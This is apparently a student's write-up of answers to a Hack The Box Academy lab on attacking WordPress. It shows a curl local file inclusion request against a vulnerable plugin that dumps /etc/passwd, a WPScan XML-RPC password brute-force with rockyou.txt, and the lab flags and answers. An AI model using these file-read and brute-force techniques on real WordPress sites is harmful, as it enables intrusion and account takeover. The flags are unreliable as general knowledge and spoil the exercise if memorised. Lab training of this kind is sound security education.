# Hacking WordPress
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Hacking WordPress
* Tier: II
* Difficulty: Easy
* Category: Offensive
* Time estimate: 6 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Directory Indexing
### Question:
![](./attachments/Pasted%20image%2020220805130622.png)

![](./attachments/Pasted%20image%2020220805114440.png)

![](./attachments/Pasted%20image%2020220805114517.png)

**Answer:** `HTB{3num3r4t10n_15_k3y}`

---
## User Enumeration
### Question:
![](./attachments/Pasted%20image%2020220805130459.png)

*Hint: Look at the "system.listMethods" method. You can filter and count the number of results with the help of "grep" and "wc".*

![](./attachments/Pasted%20image%2020220805115335.png)

**Answer:** `ch4p`

---
## Login
### Question:
![](./attachments/Pasted%20image%2020220805130806.png)

*Hint: Look at the "system.listMethods" method. You can filter and count the number of results with the help of "grep" and "wc".*

[Attack description](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/).

![](./attachments/Pasted%20image%2020220805123017.png)

cURL not working:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -X POST "http://206.189.124.56:30182/xmlrpc.php" -H "Host: 206.189.124.56:30182" -H "Cookie: htb_sessid=YWY2MTcyZGExZjM1M2E5YjliYmJhYWMzYWMxZWQ0YzQ6NDM0OTkwYzhhMjVkMmJlOTQ4NjM1NjFhZTk4YmQ2ODI%3D" -H "Content-Length: 131" -d "<?xml version="1.0" encoding="utf-8"?>" -d "<methodCall>" -d "<methodName>system.listMethods</methodName>" -d "<params></params>" -d "</methodCall>"
```

**Answer:** `80`

---
## WPScan Enumeration
### Question:
![](./attachments/Pasted%20image%2020220805131011.png)

*Hint: Look for available options in the help menu of WPScan.*

```
┌──(kali㉿kali)-[~/Downloads]
└─$ wpscan --url http://178.62.115.160:30050 -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://178.62.115.160:30050/ [178.62.115.160]
[+] Started: Fri Aug  5 06:43:24 2022

Interesting Finding(s):

(...)

[i] Plugin(s) Identified:

(...)

[+] photo-gallery
 | Location: http://178.62.115.160:30050/wp-content/plugins/photo-gallery/
 | Last Updated: 2022-08-02T04:47:00.000Z
 | [!] The version is out of date, the latest version is 1.7.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.5.34 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://178.62.115.160:30050/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34
 |  - http://178.62.115.160:30050/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34
 |  - http://178.62.115.160:30050/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34
 |  - http://178.62.115.160:30050/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://178.62.115.160:30050/wp-content/plugins/photo-gallery/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://178.62.115.160:30050/wp-content/plugins/photo-gallery/readme.txt

(...)

[+] Finished: Fri Aug  5 06:43:27 2022
[+] Requests Done: 2
[+] Cached Requests: 41
[+] Data Sent: 628 B
[+] Data Received: 19.668 KB
[+] Memory used: 228.188 MB
[+] Elapsed time: 00:00:03
```

**Answer:** `1.5.34`

---
## Exploiting a Vulnerable Plugin
### Question:
![](./attachments/Pasted%20image%2020220805131108.png)

*Hint: The user has "/bin/bash" at the end of their entry in the "/etc/passwd" file.*

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://178.62.115.160:32513/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
wp-user:x:1000:1000:Linux User,,,:/home/wp-user:/sbin/nologin
sally.jones:x:1001:1001:Linux User,,,:/home/sally.jones:/bin/bash
```

**Answer:** `sally.jones`

---
## Attacking WordPress Users
### Question:
![](./attachments/Pasted%20image%2020220805131147.png)

*Hint: You can find this wordlist under "/opt/SecLists/Passwords/Leaked-Databases" in the "rockyou.txt.tar.gz" archive. You must extract the wordlist file before being able to use it..*

```
┌──(kali㉿kali)-[~/Downloads]
└─$ wpscan --password-attack xmlrpc -t 20 -U roger -P ~/seclists/Passwords/Leaked-Databases/rockyou.txt --url http://178.62.115.160:32513

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://178.62.115.160:32513/ [178.62.115.160]
[+] Started: Fri Aug  5 06:54:52 2022

Interesting Finding(s):

(...)

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <===========================================================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - roger / lizard                                                                                                                                
Trying roger / leonard Time: 00:01:22 <                                                                          > (1900 / 14346291)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: roger, Password: lizard
```

**Answer:** `lizard`

---
## Remote Code Execution (RCE) via the Theme Editor
### Question:
![](./attachments/Pasted%20image%2020220805131222.png)

*Hint: User home subdirectories are typically found in the same standard directory on Linux servers.*

Login as admin at `http://139.59.168.125:30734/wp-login.php`

![](./attachments/Pasted%20image%2020220805132621.png)

![](./attachments/Pasted%20image%2020220805133401.png)

**Answer:** `HTB{rc3_By_d3s1gn}`

---
## Skills Assessment
### Question 1:
![](./attachments/Pasted%20image%2020220805130003.png)

**Answer:** ``

---
### Question 2:
![](./attachments/Pasted%20image%2020220805130054.png)

**Answer:** ``

---
### Question 3:
![](./attachments/Pasted%20image%2020220805130106.png)

**Answer:** ``

---
### Question 4:
![](./attachments/Pasted%20image%2020220805130117.png)

**Answer:** ``

---
### Question 5:
![](./attachments/Pasted%20image%2020220805130124.png)

*Hint: Review the WPScan output*

**Answer:** ``

---
### Question 6:
![](./attachments/Pasted%20image%2020220805130137.png)

**Answer:** ``

---
### Question 7:
![](./attachments/Pasted%20image%2020220805130137.png)

**Answer:** ``

---
### Question 8:
![](./attachments/Pasted%20image%2020220805130137.png)

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]